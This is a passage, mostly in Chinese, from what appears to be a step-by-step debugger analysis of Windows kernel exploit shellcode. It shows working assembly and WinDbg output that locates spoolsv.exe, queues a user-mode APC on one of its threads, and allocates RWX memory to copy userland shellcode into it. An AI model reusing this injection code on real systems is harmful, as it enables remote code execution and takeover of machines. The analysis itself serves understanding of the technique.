       +0x000 Pcb              : _KPROCESS
       +0x2e0 ProcessLock      : _EX_PUSH_LOCK
       +0x2e8 UniqueProcessId  : 0x00000000`0000074c Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffca8d`179455f0 - 0xffffca8d`13fa15f0 ]
       ......
       +0x450 ImageFileName    : [15]  "spoolsv.exe"
  * nt!PsGetProcessPeb && nt!PsGetThreadTeb  
然后通过调用nt!PsGetProcessPeb，获取”spoolsv.exe”的PEB结构（偏移0x3f8处）并保存起来，然后通过ThreadListHead遍历ThreadListEntry，以寻找一个Queue不为0的KTHREAD（可通过nt!PsGetThreadTeb函数获取TEB结构在KTHREAD结构中的偏移，然后减8得到Queue）。
    kd> dt _EPROCESS @rcx
    nt!_EPROCESS
       +0x000 Pcb              : _KPROCESS
       +0x2e0 ProcessLock      : _EX_PUSH_LOCK
       +0x2e8 UniqueProcessId  : 0x00000000`0000074c Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffca8d`179455f0 - 0xffffca8d`13fa15f0 ]
       ......
       +0x3f8 Peb              : 0x00000000`00360000 _PEB
       ......
       +0x488 ThreadListHead   : _LIST_ENTRY [ 0xffffca8d`18313738 - 0xffffca8d`178e9738 ]
    kd> dt _kTHREAD @rdx
    nt!_KTHREAD
       +0x000 Header           : _DISPATCHER_HEADER
       +0x018 SListFaultAddress : (null) 
       +0x020 QuantumTarget    : 0x3b5dc10
       +0x028 InitialStack     : 0xfffffe80`76556c90 Void
       +0x030 StackLimit       : 0xfffffe80`76551000 Void
       +0x038 StackBase        : 0xfffffe80`76557000 Void
       ......
       +0x0e8 Queue            : 0xffffca8d`1307d180 _DISPATCHER_HEADER
       +0x0f0 Teb              : 0x00000000`00387000 Void
    kd> r rdx    //目标KTHREAD
    rdx=ffffca8d178e9080
    kd> dt _ETHREAD @rdx   //感觉这个没啥用，先留着
    nt!_ETHREAD
       +0x000 Tcb              : _KTHREAD
       ......
       +0x6b8 ThreadListEntry  : _LIST_ENTRY [ 0xffffca8d`18cbe6c8 - 0xffffca8d`16d2e738 ]
###  向目标线程插入APC对象
  * nt!KeInitializeApc  
通过调用nt!KeInitializeApc函数来初始化APC对象（KAPC类型)。如下所示，第一个参数指明了待初始化的APC对象，第二个参数关联上面的kTHREAD结构，第四个参数为KernelApcRoutine函数指针，第七个参数指明了UserMode：
        ; KeInitializeApc(PKAPC,    //0xfffff78000000e30
        ;                 PKTHREAD,     //0xffffca8d178e9080
        ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
        ;                 PKKERNEL_ROUTINE = kernel_apc_routine,  //0xfffff78000000a62
        ;                 PKRUNDOWN_ROUTINE = NULL,
        ;                 PKNORMAL_ROUTINE = userland_shellcode,  ;fffff780`00000e00
        ;                 KPROCESSOR_MODE = UserMode (1),
        ;                 PVOID Context);   ;fffff780`00000e00
        lea rcx, [rbp+DATA_KAPC_OFFSET]     ; PAKC
        xor r8, r8      ; OriginalApcEnvironment
        lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
        push rbp    ; context
        push 1      ; UserMode
        push rbp    ; userland shellcode (MUST NOT be NULL) 
        push r8     ; NULL
        sub rsp, 0x20   ; shadow stack
        mov edi, KEINITIALIZEAPC_HASH
        call win_api_direct
    //初始化后的KAPC结构
    kd> dt _kapc fffff78000000e30
    nt!_KAPC
       +0x000 Type             : 0x12 ''
       +0x001 SpareByte0       : 0 ''
       +0x002 Size             : 0x58 'X'
       +0x003 SpareByte1       : 0 ''
       +0x004 SpareLong0       : 0
       +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
       +0x010 ApcListEntry     : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
       +0x020 KernelRoutine    : 0xfffff780`00000a62     void  +fffff78000000a62
       +0x028 RundownRoutine   : (null) 
       +0x030 NormalRoutine    : 0xfffff780`00000e00     void  +fffff78000000e00
       +0x020 Reserved         : [3] 0xfffff780`00000a62 Void
       +0x038 NormalContext    : 0xfffff780`00000e00 Void
       +0x040 SystemArgument1  : (null) 
       +0x048 SystemArgument2  : (null) 
       +0x050 ApcStateIndex    : 0 ''
       +0x051 ApcMode          : 1 ''
       +0x052 Inserted         : 0 ''
    kd> u 0xfffff780`00000a62    //KernelRoutine
    fffff780`00000a62 55              push    rbp
    fffff780`00000a63 53              push    rbx
    fffff780`00000a64 57              push    rdi
    fffff780`00000a65 56              push    rsi
    fffff780`00000a66 4157            push    r15
    fffff780`00000a68 498b28          mov     rbp,qword ptr [r8]
    fffff780`00000a6b 4c8b7d08        mov     r15,qword ptr [rbp+8]
    fffff780`00000a6f 52              push    rdx
  * nt!KeInsertQueueApc然后通过nt!KeInsertQueueApc函数将初始化后的APC对象存放到目标线程的APC队列中。
    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
        ;   SystemArgument1 is second argument in usermode code (rdx)
        ;   SystemArgument2 is third argument in usermode code (r8)
        lea rcx, [rbp+DATA_KAPC_OFFSET]
        ;xor edx, edx   ; no need to set it here
        ;xor r8, r8     ; no need to set it here
        xor r9, r9
        mov edi, KEINSERTQUEUEAPC_HASH
        call win_api_direct
    kd> dt _kapc fffff78000000e30
    nt!_KAPC
       +0x000 Type             : 0x12 ''
       +0x001 SpareByte0       : 0 ''
       +0x002 Size             : 0x58 'X'
       +0x003 SpareByte1       : 0 ''
       +0x004 SpareLong0       : 0
       +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
       +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffca8d`178e9128 - 0xffffca8d`178e9128 ]
       +0x020 KernelRoutine    : 0xfffff780`00000a62     void  +fffff78000000a62
       +0x028 RundownRoutine   : (null) 
       +0x030 NormalRoutine    : 0xfffff780`00000e00     void  +fffff78000000e00
       +0x020 Reserved         : [3] 0xfffff780`00000a62 Void
       +0x038 NormalContext    : 0xfffff780`00000e00 Void
       +0x040 SystemArgument1  : 0x0000087f`fffff200 Void
       +0x048 SystemArgument2  : (null) 
       +0x050 ApcStateIndex    : 0 ''
       +0x051 ApcMode          : 1 ''
       +0x052 Inserted         : 0x1 ''
然后判断KAPC.ApcListEntry中UserApcPending比特位是否被设置，如果成功，就等待目标线程获得权限，执行APC例程，执行KernelApcRoutine函数。
        mov rax, [rbp+DATA_KAPC_OFFSET+0x10]     ; get KAPC.ApcListEntry
        ; EPROCESS pointer 8 bytes
        ; InProgressFlags 1 byte
        ; KernelApcPending 1 byte
        ; * Since Win10 R5:
        ;   Bit 0: SpecialUserApcPending
        ;   Bit 1: UserApcPending
        ; if success, UserApcPending MUST be 1
        test byte [rax+0x1a], 2
        jnz _insert_queue_apc_done
    kd> p
    fffff780`000009e7 f6401a02        test    byte ptr [rax+1Ah],2
    kd> dt _kapc fffff78000000e30
    nt!_KAPC
       +0x000 Type             : 0x12 ''
       +0x001 SpareByte0       : 0 ''
       +0x002 Size             : 0x58 'X'
       +0x003 SpareByte1       : 0 ''
       +0x004 SpareLong0       : 0
       +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
       +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffca8d`178e9128 - 0xffffca8d`178e9128 ]
    kd> dx -id 0,0,ffffca8d10ea3340 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0xfffff78000000e40))
    (*((ntkrnlmp!_LIST_ENTRY *)0xfffff78000000e40))                 [Type: _LIST_ENTRY]
        [+0x000] Flink            : 0xffffca8d178e9128 [Type: _LIST_ENTRY *]
        [+0x008] Blink            : 0xffffca8d178e9128 [Type: _LIST_ENTRY *]
    kd> db rax l1a+1
    ffffca8d`178e9128  40 0e 00 00 80 f7 ff ff-40 0e 00 00 80 f7 ff ff  @.......@.......
    ffffca8d`178e9138  40 e2 cb 18 8d ca ff ff-00 00 02                 @..........
###  KernelApcRoutine函数
在这个函数里先将IRQL设置为PASSIVE_LEVEL（通过在KernelApcRoutine中将cr8置0），以便调用ZwAllocateVirtualMemory函数。
  * 申请空间并复制用户态Shellcode  
调用ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000,
0x40)分配内存，然后将用户态Shellcode复制过去。如下所示，分配到的地址为bc0000。
    kd> dd rdx l1